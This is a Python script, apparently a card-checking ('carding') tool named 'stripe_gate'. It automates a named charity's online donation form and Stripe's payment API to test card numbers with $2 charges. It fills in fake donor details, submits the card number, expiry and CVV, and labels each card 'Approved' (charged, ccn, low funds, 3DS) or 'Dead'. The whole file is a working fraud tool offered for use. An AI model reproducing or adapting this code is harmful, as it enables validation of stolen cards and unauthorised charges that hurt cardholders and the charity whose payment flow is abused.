from httpx import AsyncClient
from utilsdf.functions import capture, random_email
import json


async def stripe_gate(cc, month, year, cvv):
    mail = random_email()
    async with AsyncClient(
        follow_redirects=True, verify=False, timeout=30
    ) as client:
        # 1. Visit donation page
        await client.get("https://www.abaana.org/donate/online")

        # 2. Setup donation step 1 - address info
        p1 = {
            "form[name]": "John Smith",
            "form[line1]": "118 W 132nd St",
            "form[city]": "New York",
            "form[county]": "New York",
            "form[postcode]": "10027",
            "form[country]": "USA",
            "form[phone]": "18019632580",
            "form[email]": mail,
            "extras[informed]": "no",
            "stepData": "",
            "stepValue": "1",
        }
        await client.post(
            "https://www.abaana.org/donate/online",
            data=p1,
        )

        # 3. Setup donation step 2 - $2 amount
        p2 = {
            "paymentMethod": "card",
            "currency": "USD",
            "amount": "2",
            "project": "Any Project",
            "addFee": "0",
            "adminFee": "",
            "stepValue": "2",
        }
        await client.post(
            "https://www.abaana.org/donate/online/step2",
            data=p2,
        )

        # 4. Create Stripe payment method
        h3 = {
            "Host": "api.stripe.com",
            "accept": "application/json",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://js.stripe.com",
            "referer": "https://js.stripe.com/",
        }

        p3 = (
            f"type=card"
            f"&billing_details[name]=John+Smith"
            f"&card[number]={cc}"
            f"&card[cvc]={cvv}"
            f"&card[exp_month]={month}"
            f"&card[exp_year]={year}"
            f"&guid=N/A&muid=N/A&sid=N/A"
            f"&pasted_fields=number"
            f"&payment_user_agent=stripe.js%2Fc5d6d3bd0a%3B+stripe-js-v3%2Fc5d6d3bd0a"
            f"&time_on_page=46000"
            f"&key=pk_live_51LhtwiGPgaK6ulcPEN1I001VvS0Ke0SlidIqaDopfpahumzL2zhNQsfb8xI4QxelHGy4BbN2Va3hTEK7dtCkbfTO000GXTCC6H"
        )

        r3 = await client.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=h3,
            data=p3,
        )

        try:
            data = r3.json()
            pm = data.get("id")
        except (json.JSONDecodeError, ValueError):
            return "Dead! ❌", "Invalid response from Stripe"

        if not pm:
            error_msg = data.get("error", {}).get("message", "Payment method failed")
            return "Dead! ❌", error_msg

        # 5. Confirm donation step 3
        p4 = {
            "do": "donate/online/step3",
            "stripeToken": pm,
            "addGiftAid": "0",
            "gift-aid": "0",
            "cardholder-name": "John Smith",
            "stepValue": "3",
        }
        await client.post(
            "https://www.abaana.org/donate/online/confirm",
            data=p4,
        )

        # 6. Re-submit amount for payment intent
        p5 = {
            "paymentMethod": "card",
            "currency": "USD",
            "amount": "2",
            "project": "Any Project",
            "addFee": "0",
            "adminFee": "",
            "stepValue": "2",
        }
        await client.post(
            "https://www.abaana.org/donate/online/step2",
            data=p5,
        )

        # 7. Create payment intent
        p6 = {"payment_method_id": pm, "site_area": "donation"}
        r6 = await client.post(
            "https://www.abaana.org/stripe-payment-intent",
            json=p6,
        )

        try:
            data = r6.json()
            msg = data.get("error", "")
        except (json.JSONDecodeError, ValueError):
            return "Dead! ❌", "Invalid payment response"

        if r6.status_code == 200 and not msg:
            status = "Approved! ✅ -» charged!"
            msg = "Success -» $2"
        elif "security code" in str(msg).lower():
            status = "Approved! ✅ -» ccn"
        elif "insufficient funds" in str(msg).lower() or "funds" in str(msg).lower():
            status = "Approved! ✅ -» low funds"
        elif "requires_action" in str(data) or "3d" in str(msg).lower():
            status = "Approved! ✅ -» 3DS"
            msg = "3D Secure Required"
        else:
            status = "Dead! ❌"
            if not msg:
                msg = "Declined"

        return status, msg
